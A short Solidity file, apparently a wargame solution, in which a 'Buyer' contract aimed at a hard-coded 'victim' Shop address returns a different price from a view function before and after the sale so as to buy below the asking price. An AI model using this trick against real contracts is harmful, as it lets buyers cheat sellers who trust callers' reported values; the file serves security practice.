// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Shop {
    uint public price = 100;
    bool public isSold;
    function buy() public {}
}

contract Buyer {

    Shop victim = Shop(0x552986EB5BC5dE8fFc0dC44443663dB0B37f6e23);

//variable is updated in Shop before second call, permitting conditional logic in the view statement
    function price() public view returns(uint) {
        if (victim.isSold()==false){
            return 100;
        } else {return 90;}
    }

    function _buy() public {
        victim.buy();
    }

}
